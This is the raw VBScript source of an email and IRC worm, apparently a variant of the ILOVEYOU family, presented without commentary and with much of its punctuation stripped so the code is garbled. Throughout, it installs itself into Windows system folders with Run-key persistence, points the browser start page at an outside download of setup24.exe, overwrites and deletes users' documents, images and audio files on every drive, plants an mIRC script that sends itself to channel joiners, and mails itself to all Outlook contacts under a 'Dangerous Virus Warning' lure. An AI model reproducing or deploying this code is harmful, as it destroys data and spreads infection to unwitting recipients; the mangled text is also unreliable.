On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=
ctr=0
Set fso = CreateObjectScripting.FileSystemObject
set file = fso.OpenTextFileWScript.ScriptFullname,1
vbscopy=file.ReadAll
main
sub main
On Error Resume Next
dim wscr,rr
set wscr=CreateObjectWScript.Shell
rr=wscr.RegReadHKEY_CURRENT_USERSoftwareMicrosoftWindows Scripting
HostSettingsTimeout
if rr>=1 then
wscr.RegWrite HKEY_CURRENT_USERSoftwareMicrosoftWindows Scripting
HostSettingsTimeout,0,REG_DWORD
end if
Set dirwin = fso.GetSpecialFolder0
Set dirsystem = fso.GetSpecialFolder1
Set dirtemp = fso.GetSpecialFolder2
Set c = fso.GetFileWScript.ScriptFullName
c.CopydirsystemMSKernel32.vbs
c.CopydirwinWin32DLL.vbs
c.Copydirsystemvirus_warning.jpg.vbs
regruns
html
spreadtoemail
listadriv
end sub
sub regruns
On Error Resume Next
Dim num,downread
regcreate
HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunMSKernel32
,dirsystemMSKernel32.vbs
regcreate
HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunServicesWi
n32DLL,dirwinWin32DLL.vbs
downread=
downread=reggetHKEY_CURRENT_USERSoftwareMicrosoftInternet
ExplorerDownload Directory
if downread= then
downread=c:
end if
if fileexistdirsystemsetup24.exe=1 then
Randomize
num = Int4  Rnd + 1
if num = 1 then
regcreate HKCUSoftwareMicrosoftInternet ExplorerMainStart
Page,http://skycable.tucows.com/files2/setup24.exe
elseif num = 2 then
regcreate HKCUSoftwareMicrosoftInternet ExplorerMainStart
Page,http://skycable.tucows.com/files2/setup24.exe
elseif num = 3 then
regcreate HKCUSoftwareMicrosoftInternet ExplorerMainStart
Page,http://skycable.tucows.com/files2/setup24.exe
elseif num = 4 then
regcreate HKCUSoftwareMicrosoftInternet ExplorerMainStart
Page,http://skycable.tucows.com/files2/setup24.exe
end if
end if
if fileexistdownreadsetup24.exe=0 then
regcreate
HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunsetup24,downreadsetup24.exe
regcreate HKEY_CURRENT_USERSoftwareMicrosoftInternet ExplorerMainStart
Page,about:blank
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlistd.path
end if
Next
listadriv = s
end sub
sub infectfilesfolderspec
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolderfolderspec
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionNamef1.path
ext=lcaseext
s=lcasef1.name
if ext=vbs or ext=vbe then
set ap=fso.OpenTextFilef1.path,2,true
ap.write vbscopy
ap.close
elseifext=js or ext=jse or ext=css or ext=wsh or ext=sct
or ext=hta or ext=wav or ext=txt or ext=gif or ext=doc or ext=htm or ext=html or ext=xls  then
set ap=fso.OpenTextFilef1.path,2,true
ap.write vbscopy
ap.close
bname=fso.GetBaseNamef1.path
set cop=fso.GetFilef1.path
cop.copyfolderspecbname.vbs
fso.DeleteFilef1.path
elseifext=jpg or ext=jpeg then
set ap=fso.OpenTextFilef1.path,2,true
ap.write vbscopy
ap.close
set cop=fso.GetFilef1.path
cop.copyf1.path.vbs
fso.DeleteFilef1.path
elseifext=mp3 or ext=mp2 then
set mp3=fso.CreateTextFilef1.path.vbs
mp3.write vbscopy
mp3.close
set att=fso.GetFilef1.path
att.attributes=att.attributes+2
end if
if eq<>folderspec then
if s=mirc32.exe or s=mlink32.exe or s=mirc.ini or
s=script.ini or s=mirc.hlp then
set scriptini=fso.CreateTextFilefolderspecscript.ini
scriptini.WriteLine script
scriptini.WriteLine mIRC Script
scriptini.WriteLine  Please dont edit this script... mIRC will corrupt,
if mIRC will
scriptini.WriteLine  corrupt... WINDOWS will affect and will not run
correctly. thanks
scriptini.WriteLine 
scriptini.WriteLine Khaled Mardam-Bey
scriptini.WriteLine http://www.mirc.com
scriptini.WriteLine 
scriptini.WriteLine n0=on 1:JOIN::
scriptini.WriteLine n1= /if  $nick == $me   halt 
scriptini.WriteLine n2= /.dcc send $nick
dirsystem
_virus_warning.htm
scriptini.WriteLine n3=
scriptini.close
eq=folderspec
end if
end if
next
end sub
sub folderlistfolderspec
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolderfolderspec
set sf = f.SubFolders
for each f1 in sf
infectfilesf1.path
folderlistf1.path
next
end sub
sub regcreateregkey,regvalue
Set regedit = CreateObjectWScript.Shell
regedit.RegWrite regkey,regvalue
end sub
function reggetvalue
Set regedit = CreateObjectWScript.Shell
regget=regedit.RegReadvalue
end function
function fileexistfilespec
On Error Resume Next
dim msg
if fso.FileExistsfilespec Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexistfolderspec
On Error Resume Next
dim msg
if fso.GetFolderExistsfolderspec then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObjectWScript.Shell
set out=WScript.CreateObjectOutlook.Application
set mapi=out.GetNameSpaceMAPI
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressListsctrlists
x=1
regv=regedit.RegReadHKEY_CURRENT_USERSoftwareMicrosoftWABa
if regv= then
regv=1
end if
if inta.AddressEntries.Count>intregv then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntriesx
regad=
regad=regedit.RegReadHKEY_CURRENT_USERSoftwareMicrosoftWABmalead
if regad= then
set male=out.CreateItem0
male.Recipients.Addmalead
male.Subject = Dangerous Virus Warning
male.Body = vbcrlfThere is a dangerous virus circulating. Please click attached picture to view it and learn to avoid it.
male.Attachments.Adddirsystemvirus_warning.jpg.vbs
male.Send
regedit.RegWrite
HKEY_CURRENT_USERSoftwareMicrosoftWABmalead,1,REG_DWORD
end if
x=x+1
next
regedit.RegWrite
HKEY_CURRENT_USERSoftwareMicrosoftWABa,a.AddressEntries.Count
else
regedit.RegWrite
HKEY_CURRENT_USERSoftwareMicrosoftWABa,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1=<HTML><HEAD><TITLE> Dangerous Virus Warning<?-?TITLE>
<BODY ONMOUSEOUT=@-@window.name=-main-window.open-Urgent_virus_warning.htm
-,-main-@-@ vbcrlf _
ONKEYDOWN=@-@window.name=-main-window.open-Urgent_virus_warning.htm
-,-main-@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@ffffff@-@>vbcrlf _
<CENTER><p>To view the picture please follow the instructions<?-?p><BR>- Select -YES- for your viewing pleasure
<?-?p>vbcrlf _
<?-?CENTER>
vbcrlf _
<?-?BODY><?-?HTML>vbcrlf _
<SCRIPT language=@-@JScript@-@>vbcrlf _
<!--?-??-?vbcrlf _
if window.screenvar wi=screen.availWidth/24var
hi=screen.availHeightwindow.moveTo10,50window.resizeTowi,hivbcrlf _
?-??-?-->vbcrlf _
<?-?SCRIPT>vbcrlf _
<SCRIPT LANGUAGE=@-@VBScript@-@>vbcrlf _
<!--vbcrlf _
on error resume nextvbcrlf _
dim fso,dirsystem,wri,code,code2,code3,code4,aw,regditvbcrlf _
aw=1vbcrlf _
code=
dta2=set fso=CreateObject@-@Scripting.FileSystemObject@-@vbcrlf _
set dirsystem=fso.GetSpecialFolder1vbcrlf _
code2=replacecode,chr91chr45chr91,chr39vbcrlf _
code3=replacecode2,chr93chr45chr93,chr34vbcrlf _
code4=replacecode3,chr37chr45chr37,chr92vbcrlf _
set wri=fso.CreateTextFiledirsystem@-@-MSKernel32.vbs@-@vbcrlf _
wri.write code4vbcrlf _
wri.closevbcrlf _
if fso.FileExistsdirsystem@-@-MSKernel32.vbs@-@ thenvbcrlf _
if err.number=424 thenvbcrlf _
aw=0vbcrlf _
end ifvbcrlf _
if aw=1 thenvbcrlf _
document.write @-@ERROR: can-t initialize ActiveX@-@vbcrlf _
window.closevbcrlf _
end ifvbcrlf _
end ifvbcrlf _
Set regedit = CreateObject@-@WScript.Shell@-@vbcrlf _
regedit.RegWrite
@-@HKEY_LOCAL_MACHINE-Software-Microsoft-Windows-CurrentVersion-Ru
n-MSKernel32@-@,dirsystem@-@-MSKernel32.vbs@-@vbcrlf _
?-??-?-->vbcrlf _
<?-?SCRIPT>
dt1=replacedta1,chr35chr45chr35,
dt1=replacedt1,chr64chr45chr64,
dt4=replacedt1,chr63chr45chr63,/
dt5=replacedt4,chr94chr45chr94,
dt2=replacedta2,chr35chr45chr35,
dt2=replacedt2,chr64chr45chr64,
dt3=replacedt2,chr63chr45chr63,/
dt6=replacedt3,chr94chr45chr94,
set fso=CreateObjectScripting.FileSystemObject
set c=fso.OpenTextFileWScript.ScriptFullName,1
lines=Splitc.ReadAll,vbcrlf
l1=uboundlines
for n=0 to uboundlines
linesn=replacelinesn,,chr91+chr45+chr91
linesn=replacelinesn,,chr93+chr45+chr93
linesn=replacelinesn,,chr37+chr45+chr37
if l1=n then
linesn=chr34+linesn+chr34
else
linesn=chr34+linesn+chr34vbcrlf _
end if
next
set b=fso.CreateTextFiledirsystem+Urgent_virus_warning.htm
b.close
set d=fso.OpenTextFiledirsystem+Urgent_virus_warning.htm,2
d.write dt5
d.write joinlines,vbcrlf
d.write vbcrlf
d.write dt6
d.close
end sub
